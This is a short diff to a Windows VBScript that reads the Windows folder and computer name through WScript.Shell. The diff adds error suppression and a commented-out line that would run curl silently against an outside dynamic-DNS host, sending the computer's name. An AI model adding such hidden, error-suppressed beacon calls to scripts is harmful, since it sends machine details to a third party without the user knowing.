@@ -1,3 +1,4 @@
+On Error Resume Next
 Set oShell = CreateObject ("WScript.Shell") 
 windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
 strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
@@ -12,7 +13,8 @@ With oShell
   
   'If UserPerms("Admin") Then
   ' Message = "Good to go"
-  ' .Run windir & "\file.pdf"
+  '.Run windir & "\file.pdf"
+   '.Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_" & strComputerName, 0, True
   'Else
   ' Message = "Non-Admin"
   'End If
